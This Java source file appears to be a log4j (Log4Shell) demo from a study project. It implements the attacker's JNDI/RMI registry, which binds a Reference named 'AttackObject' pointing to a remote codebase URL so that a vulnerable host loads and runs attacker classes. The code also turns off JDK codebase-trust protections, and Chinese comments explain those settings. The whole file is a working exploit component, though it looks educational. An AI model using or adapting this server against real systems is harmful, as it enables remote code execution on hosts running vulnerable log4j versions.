package com.huihui.aligo.bug.log4j.demo1;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * JNDI服务
 * @author minghui.y
 * @create 2021-12-12 9:48 下午
 **/
public class RegistryServer {

    public static void main( String[] args ) throws RemoteException, NamingException, AlreadyBoundException {

        //在RMI服务中引用远程对象将受本地Java环境限制即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，
        // 如果该值为true则禁止引用远程对象。除此之外被引用的ObjectFactory对象还将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，
        // 如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象
        //TODO 受限于JDK版本，即使设置下面参数也无效
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty( "com.sun.jndi.rmi.object.trustURLCodebase", "true");

        Registry registry = LocateRegistry.createRegistry( 1099 );
        Reference ref = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:80");
        ReferenceWrapper wrapper = new ReferenceWrapper( ref );
        registry.bind( "obj", wrapper );

        System.out.println("RegistryServer is running...");

    }
}
